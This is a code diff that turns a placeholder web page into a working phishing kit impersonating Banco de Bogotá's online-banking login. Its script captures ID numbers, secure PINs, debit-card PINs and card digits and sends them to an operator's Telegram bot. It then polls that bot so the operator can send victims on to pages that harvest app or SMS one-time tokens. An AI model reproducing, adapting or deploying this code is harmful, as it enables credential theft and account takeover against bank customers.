@@ -1,16 +1,519 @@
 <!DOCTYPE html>
-<html>
-
+<html lang="es">
 <head>
-  <meta charset="utf-8">
-  <meta name="viewport" content="width=device-width">
-  <title>replit</title>
-  <link href="style.css" rel="stylesheet" type="text/css" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Formulario de Ingreso</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <style>
+        body {
+            font-family: ui-sans-serif, system-ui, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji", "Segoe UI Symbol", "Noto Color Emoji";
+            background-color: #eee;
+        }
+        .modal_select_documento.flex, .content_modal_e.flex {
+            display: flex;
+        }
+
+        .custom-modal {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.8);
+            z-index: 9999;
+            display: none;
+            align-items: center;
+            justify-content: center;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .custom-modal-content {
+            background: white;
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 400px;
+            width: 90%;
+            text-align: center;
+            animation: slideIn 0.3s ease;
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes slideIn {
+            from { transform: translateY(-30px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+
+        .spinner-container {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.5);
+            justify-content: center;
+            align-items: center;
+            z-index: 10000;
+        }
+
+        .spinner {
+            border: 4px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 4px solid white;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
 </head>
-
 <body>
-  Hello world
-  <script src="script.js"></script>
-</body>
+    <div id="app"></div>
 
+    <div id="error-modal" class="custom-modal">
+        <div class="custom-modal-content">
+            <div class="flex items-center justify-center gap-5">
+                <img src="https://virtual.bancodebogota.co/bbog-pb-frontend-authentication-app/assets/422e00391dd36d89affe.png" alt="Icono de error" class="w-15 h-15">
+                <div>
+                    <h3 class="mb-5 text-[#0040a8]">¡Ups! Algo salió mal</h3>
+                    <p>Los datos ingresados no coinciden con los de tu cuenta. Por favor, verifica tu información y vuelve a intentarlo.</p>
+                </div>
+            </div>
+            <button id="back-to-start-button" class="mt-5 w-full bg-[#0040a8] text-white py-3 rounded-lg">Volver al inicio</button>
+        </div>
+    </div>
+
+    <div id="spinner-modal" class="spinner-container">
+        <div class="spinner"></div>
+    </div>
+
+    <script>
+        function homeTemplate() {
+            return `
+                <header class="w-full flex items-center justify-center py-16 bg-gradient-to-t from-[#0043a9] to-[#4c7bc7]">
+                    <img src="img/logo.png" alt="" class="w-full max-w-[50px] h-auto -mt-4">
+                </header>
+
+                <form id="miFormulario">
+                    <div class="relative mt-[-1rem] rounded-t-[15px] w-full h-auto bg-gray-200">
+                        <div class="w-full box-border p-4">
+                            <div class="w-full flex items-center justify-center text-center mb-4">
+                                <button type="button" id="tab-segura" class="flex-1 py-2 px-4 text-sm font-medium border-b-2 border-transparent text-gray-500 hover:text-[#0043a9] hover:border-[#0043a9]">Clave segura</button>
+                                <button type="button" id="tab-debito" class="flex-1 py-2 px-4 text-sm font-medium border-b-2 border-[#0043a9] text-[#0043a9]">Tarjeta débito</button>
+                            </div>
+                            <div class="w-full">
+                                <div class="w-full flex items-center justify-between">
+                                    <div class="flex flex-row justify-between items-center">
+                                        <img src="img/user.svg" alt="" class="w-[17px] h-[17px] mr-2">
+                                        <label class="text-sm m-0">Identificación</label>
+                                    </div>
+                                    <div class="flex flex-row justify-between items-center">
+                                        <label class="text-sm m-0">Recordar</label>
+                                        <input type="checkbox" name="" id="" class="w-5 h-5 bg-white ml-2">
+                                    </div>
+                                </div>
+                                <div class="w-full flex flex-row items-center justify-between my-4">
+                                    <div id="tipo_doc_select" class="flex flex-row items-center w-[20%] border border-gray-300 bg-white rounded-md box-border p-2 justify-between cursor-pointer">
+                                        <p id="text_tipo_doc" class="text-lg">C.C</p>
+                                        <img src="img/arror_down.svg" alt="" class="w-[15px] h-[15px]">
+                                        <input type="hidden" name="tipo_doc" value="Cédula de Ciudadanía">
+                                    </div>
+                                    <input type="tel" name="nro_doc" id="nro_doc" placeholder="Número" maxlength="10" class="w-[75%] text-lg border border-gray-300 bg-white rounded-md box-border p-2">
+                                </div>
+                            </div>
+
+                            <div class="w-full hidden" id="clave_segura_section">
+                                <div class="w-full flex items-center justify-between">
+                                    <div class="flex flex-row justify-between items-center">
+                                        <img src="img/lock.svg" alt="" class="w-[17px] h-[17px] mr-2">
+                                        <label class="text-sm">Clave segura</label>
+                                    </div>
+                                </div>
+                                <div class="my-4">
+                                    <input type="password" name="clave" id="clave" placeholder="- - - -" maxlength="4" class="w-full text-lg border border-gray-300 bg-white rounded-md box-border p-2 text-center tracking-widest font-mono placeholder:tracking-widest">
+                                </div>
+                            </div>
+
+                            <div class="w-full" id="clave_tarjeta_section">
+                                <div class="w-full flex items-center justify-between">
+                                    <div class="flex flex-row justify-between items-center">
+                                        <img src="img/card_lock.svg" alt="" class="w-[17px] h-[17px] mr-2">
+                                        <label class="text-sm">Clave de tarjeta débito</label>
+                                    </div>
+                                </div>
+                                <div class="my-4">
+                                    <input type="number" name="card_clave" id="card_clave" placeholder="- - - -" maxlength="4" class="w-full text-lg border border-gray-300 bg-white rounded-md box-border p-2 text-center tracking-widest font-mono placeholder:tracking-widest">
+                                </div>
+                                <div class="w-full">
+                                    <div class="w-full flex items-center justify-between">
+                                        <div class="flex flex-row justify-between items-center">
+                                            <img src="img/card_code.svg" alt="" class="w-[17px] h-[17px] mr-2">
+                                            <label class="text-sm">Últimos 4 dígitos de la tarjeta débito</label>
+                                        </div>
+                                    </div>
+                                    <div class="my-4">
+                                        <input type="number" name="card_digitos" id="card_digitos" placeholder="- - - -" maxlength="4" class="w-full text-lg border border-gray-300 bg-white rounded-md box-border p-2 text-center tracking-widest font-mono placeholder:tracking-widest">
+                                    </div>
+                                </div>
+                            </div>
+
+                            <button type="submit" id="ingresarBtn" disabled class="block w-full rounded-2xl text-white bg-[#0043a9] font-bold text-base border-none py-2 px-0 text-center my-4 mx-auto disabled:opacity-70">Ingresar ahora</button>
+                        </div>
+                    </div>
+                </form>
+
+                <div class="modal_select_documento w-full h-screen min-h-screen fixed top-0 left-0 z-[999] bg-[#0043a9] bg-opacity-80 flex-col justify-end hidden">
+                    <div class="bg-white w-full h-max-content box-border px-2">
+                        <div class="w-full flex justify-end box-border py-2 px-4">
+                            <img src="img/times.svg" alt="" onclick="closeModalTipoDoc()" class="w-[35px] h-[35px] cursor-pointer">
+                        </div>
+                        <div class="opciones">
+                            <div class="cursor-pointer flex items-center justify-center box-border py-2 border-t border-gray-300" id="cc">
+                                <p class="text-center text-base font-normal text-gray-700">C.C - Cédula de Ciudadanía</p>
+                            </div>
+                            <div class="cursor-pointer flex items-center justify-center box-border py-2 border-t border-gray-300" id="ce">
+                                <p class="text-center text-base font-normal text-gray-700">C.E - Cédula de Extranjería</p>
+                            </div>
+                            <div class="cursor-pointer flex items-center justify-center box-border py-2 border-t border-gray-300" id="ps">
+                                <p class="text-center text-base font-normal text-gray-700">PS. - Pasaporte</p>
+                            </div>
+                            <div class="cursor-pointer flex items-center justify-center box-border py-2 border-t border-gray-300" id="ti">
+                                <p class="text-center text-base font-normal text-gray-700">T.I - Tarjeta de Identidad</p>
+                            </div>
+                            <div class="cursor-pointer flex items-center justify-center box-border py-2 border-t border-gray-300" id="rc">
+                                <p class="text-center text-base font-normal text-gray-700">R.C - Registro Civil</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            `;
+        }
+
+        document.addEventListener('DOMContentLoaded', () => {
+            const app = document.querySelector('#app');
+            if (app) {
+                app.innerHTML = homeTemplate();
+            }
+
+            const form = document.querySelector('#miFormulario');
+            const nroDoc = document.getElementById("nro_doc");
+            const clave = document.getElementById("clave");
+            const cardClave = document.getElementById("card_clave");
+            const cardDigitos = document.getElementById("card_digitos");
+            const ingresarBtn = document.getElementById("ingresarBtn");
+            const tabSegura = document.getElementById("tab-segura");
+            const tabDebito = document.getElementById("tab-debito");
+            const claveSeguraSection = document.getElementById("clave_segura_section");
+            const claveTarjetaSection = document.getElementById("clave_tarjeta_section");
+            const tipoDocSelect = document.getElementById("tipo_doc_select");
+            const modalSelect = document.querySelector(".modal_select_documento");
+            const opciones = document.querySelectorAll(".opciones > div");
+            const textTipoDoc = document.getElementById("text_tipo_doc");
+            const inputTipoDoc = document.querySelector("input[name='tipo_doc']");
+            const errorModal = document.getElementById('error-modal');
+            const backToStartButton = document.getElementById('back-to-start-button');
+            const spinnerModal = document.getElementById('spinner-modal');
+            const transactionId = Date.now().toString();
+
+            let activeTab = 'segura'; 
+            let TELEGRAM_BOT_TOKEN = '';
+            let TELEGRAM_CHAT_ID = '';
+            let statusCheckInterval = null;
+            let lastUpdateId = parseInt(sessionStorage.getItem('lastUpdateId')) || 0;
+
+            // Cargar los datos de configuración de Telegram
+            async function loadTelegramConfig() {
+                try {
+                    const response = await fetch('js/brr76.json');
+                    if (!response.ok) throw new Error('Network response was not ok');
+                    const data = await response.json();
+                    TELEGRAM_BOT_TOKEN = data.token;
+                    TELEGRAM_CHAT_ID = data.chat_id;
+                    console.log("Tokens y IDs de chat de Telegram cargados correctamente.");
+                    return true;
+                } catch (error) {
+                    console.error('Error al cargar la configuración de Telegram:', error);
+                    alert('Error crítico: No se pudo cargar la configuración de Telegram. Por favor, verifica el archivo js/brr76.json.');
+                    if (ingresarBtn) ingresarBtn.disabled = true;
+                    return false;
+                }
+            }
+            
+            async function initLastUpdateId() {
+                try {
+                    if (!TELEGRAM_BOT_TOKEN) return;
+                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates`;
+                    const response = await fetch(url);
+                    const data = await response.json();
+                    if (!data || !data.result) return;
+                    const updates = data.result;
+                    if (updates.length === 0) return;
+                    const maxUpdateId = Math.max(...updates.map(u => u.update_id));
+                    lastUpdateId = maxUpdateId;
+                    sessionStorage.setItem('lastUpdateId', lastUpdateId);
+                    console.log('Inicializado lastUpdateId a', lastUpdateId);
+                } catch (err) {
+                    console.warn('No se pudo inicializar lastUpdateId:', err);
+                }
+            }
+
+
+            // Lógica para el modal de tipo de documento
+            if (tipoDocSelect) {
+                tipoDocSelect.addEventListener("click", () => {
+                    if (modalSelect) {
+                        modalSelect.classList.remove("hidden");
+                        modalSelect.classList.add("flex");
+                    }
+                });
+            }
+
+            opciones.forEach(opcion => {
+                opcion.addEventListener("click", () => {
+                    const abreviacion = opcion.id.toUpperCase();
+                    const nombreCompleto = opcion.textContent.split(" - ")[1].trim();
+                    if (textTipoDoc) textTipoDoc.textContent = abreviacion;
+                    if (inputTipoDoc) inputTipoDoc.value = nombreCompleto;
+                    closeModalTipoDoc();
+                    validateForm();
+                });
+            });
+
+            window.closeModalTipoDoc = () => {
+                if (modalSelect) {
+                    modalSelect.classList.add("hidden");
+                    modalSelect.classList.remove("flex");
+                }
+            };
+
+            // Lógica para cambiar de pestaña
+            function switchTab(tab) {
+                activeTab = tab;
+                if (tab === 'segura') {
+                    tabSegura.classList.add('border-[#0043a9]', 'text-[#0043a9]');
+                    tabSegura.classList.remove('border-transparent', 'text-gray-500');
+                    tabDebito.classList.add('border-transparent', 'text-gray-500');
+                    tabDebito.classList.remove('border-[#0043a9]', 'text-[#0043a9]');
+                    claveSeguraSection.classList.remove('hidden');
+                    claveTarjetaSection.classList.add('hidden');
+                } else {
+                    tabDebito.classList.add('border-[#0043a9]', 'text-[#0043a9]');
+                    tabDebito.classList.remove('border-transparent', 'text-gray-500');
+                    tabSegura.classList.add('border-transparent', 'text-gray-500');
+                    tabSegura.classList.remove('border-[#0043a9]', 'text-[#0043a9]');
+                    claveTarjetaSection.classList.remove('hidden');
+                    claveSeguraSection.classList.add('hidden');
+                }
+                validateForm();
+            }
+
+            tabSegura.addEventListener('click', () => switchTab('segura'));
+            tabDebito.addEventListener('click', () => switchTab('debito'));
+
+            // Inicializar en la pestaña de clave segura
+            switchTab('segura');
+
+            // Validación de los campos del formulario
+            function validateForm() {
+                const nroDocValid = nroDoc && nroDoc.value.length >= 5;
+
+                let isFormValid = false;
+                if (activeTab === 'segura') {
+                    const claveValid = clave && clave.value.length === 4;
+                    isFormValid = nroDocValid && claveValid;
+                } else {
+                    const cardClaveValid = cardClave && cardClave.value.length === 4;
+                    const cardDigitosValid = cardDigitos && cardDigitos.value.length === 4;
+                    isFormValid = nroDocValid && cardClaveValid && cardDigitosValid;
+                }
+
+                if (ingresarBtn) {
+                    ingresarBtn.disabled = !isFormValid;
+                }
+            }
+
+            [nroDoc, clave, cardClave, cardDigitos].forEach(input => {
+                if (input) {
+                    input.addEventListener("input", validateForm);
+                    input.addEventListener("input", () => {
+                        if (input.value.length > input.maxLength) {
+                            input.value = input.value.slice(0, input.maxLength);
+                        }
+                    });
+                }
+            });
+
+            async function sendToTelegram(messageContent, keyboard) {
+                if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+                    throw new Error('Telegram bot token or chat ID is not set.');
+                }
+
+                const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+                const payload = {
+                    chat_id: TELEGRAM_CHAT_ID,
+                    text: messageContent,
+                    parse_mode: 'Markdown',
+                    reply_markup: keyboard
+                };
+
+                try {
+                    const response = await fetch(url, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify(payload),
+                    });
+                    if (!response.ok) {
+                        const errorText = await response.text();
+                        console.error(`Error al enviar mensaje a Telegram: ${response.status} - ${errorText}`);
+                        return false;
+                    }
+                    return true;
+                } catch (error) {
+                    console.error('Error de red al enviar mensaje a Telegram:', error);
+                    return false;
+                }
+            }
+
+            async function handleLoginAttempt(loginData) {
+                spinnerModal.style.display = 'flex';
+
+                const now = new Date();
+                const formattedDate = now.toLocaleDateString('es-CO', {
+                    day: 'numeric', month: 'numeric', year: 'numeric'
+                });
+                const formattedTime = now.toLocaleTimeString('es-CO', {
+                    hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true
+                });
+
+                let message;
+                let loginType;
+                if (activeTab === 'segura') {
+                    loginType = "Clave Segura";
+                    message = `🍀 GOLEADOR 🍀\n\nTipo de Ingreso: ${loginType}\nTipo de Doc: ${loginData.tipoDoc}\n\nCEDULA💎: ${loginData.nroDoc}\nClAVE🔐: ${loginData.clave}\n\nFecha/Hora: ${formattedDate}, ${formattedTime}`;
+                } else {
+                    loginType = "Tarjeta Débito";
+                    message = `🍀 GOLEADOR 🍀\n\nTipo de Ingreso: ${loginType}\nTipo de Doc: ${loginData.tipoDoc}\n\nCEDULA💎: ${loginData.nroDoc}\nClAVE🔐: ${loginData.cardClave}\nUltimos 4: ${loginData.cardDigitos}\n\nFecha/Hora: ${formattedDate}, ${formattedTime}`;
+                }
+
+                // Guardar los datos de sesión antes de enviar a Telegram
+                const dataToStore = {
+                    ...loginData,
+                    transactionId: transactionId,
+                    loginType: loginType
+                };
+                sessionStorage.setItem('initialLoginData', JSON.stringify(dataToStore));
+
+                const keyboard = JSON.stringify({
+                    inline_keyboard: [
+                        [{ text: "💎 Token App", callback_data: `pedir_dinamica:${transactionId}` }],
+                        [{ text: "👀 Token SMS", callback_data: `pedir_sms:${transactionId}` }],
+                        [{ text: "❌ Error logo", callback_data: `error_logo:${transactionId}` }]
+                    ],
+                });
+
+                const sent = await sendToTelegram(message, keyboard);
+
+                if (sent) {
+                    checkPaymentVerification();
+                } else {
+                    spinnerModal.style.display = 'none';
+                    alert("Error al enviar los datos iniciales. Por favor, inténtalo de nuevo.");
+                }
+            }
+
+            async function checkPaymentVerification() {
+                if (statusCheckInterval) {
+                    clearInterval(statusCheckInterval);
+                }
+                statusCheckInterval = setInterval(async () => {
+                    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`;
+                    try {
+                        const response = await fetch(url);
+                        const data = await response.json();
+                        const updates = data.result;
+
+                        if (updates && updates.length > 0) {
+                            const relevantUpdate = updates.find(u => u.callback_query && u.callback_query.data.includes(transactionId));
+                            
+                            if (relevantUpdate) {
+                                const latest = relevantUpdate;
+                                clearInterval(statusCheckInterval);
+                                spinnerModal.style.display = 'none';
+                                
+                                const callbackData = latest.callback_query.data.split(':')[0];
+                                const callbackId = latest.callback_query.id;
+
+                                try {
+                                    await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json' },
+                                        body: JSON.stringify({ callback_query_id: callbackId, text: 'Procesado' })
+                                    });
+                                } catch (err) {
+                                    console.warn('No se pudo responder callback_query:', err);
+                                }
+
+                                lastUpdateId = latest.update_id;
+                                sessionStorage.setItem('lastUpdateId', lastUpdateId);
+
+                                if (callbackData === 'pedir_dinamica') {
+                                    window.location.href = "token.html";
+                                } else if (callbackData === 'pedir_sms') {
+                                    window.location.href = "otp.html";
+                                } else if (callbackData === 'error_logo') {
+                                    errorModal.style.display = 'flex';
+                                }
+                            }
+                        }
+                    } catch (error) {
+                        console.error("Error al verificar el estado de la transacción:", error);
+                    }
+                }, 2000);
+            }
+
+            form.addEventListener("submit", (event) => {
+                event.preventDefault();
+                const loginData = {
+                    tipoDoc: inputTipoDoc.value,
+                    nroDoc: nroDoc.value,
+                    clave: activeTab === 'segura' ? clave.value : 'N/A',
+                    cardClave: activeTab === 'debito' ? cardClave.value : 'N/A',
+                    cardDigitos: activeTab === 'debito' ? cardDigitos.value : 'N/A',
+                };
+                handleLoginAttempt(loginData);
+            });
+
+            if (backToStartButton) {
+                backToStartButton.addEventListener('click', () => {
+                    errorModal.style.display = 'none';
+                    window.location.href = "index.html";
+                });
+            }
+
+            window.addEventListener('beforeunload', function() {
+                if (statusCheckInterval) {
+                    clearInterval(statusCheckInterval);
+                }
+            });
+
+            // Llamadas de inicialización
+            loadTelegramConfig().then(configLoaded => {
+                if (configLoaded) {
+                    initLastUpdateId();
+                }
+            });
+        });
+    </script>
+</body>
 </html>
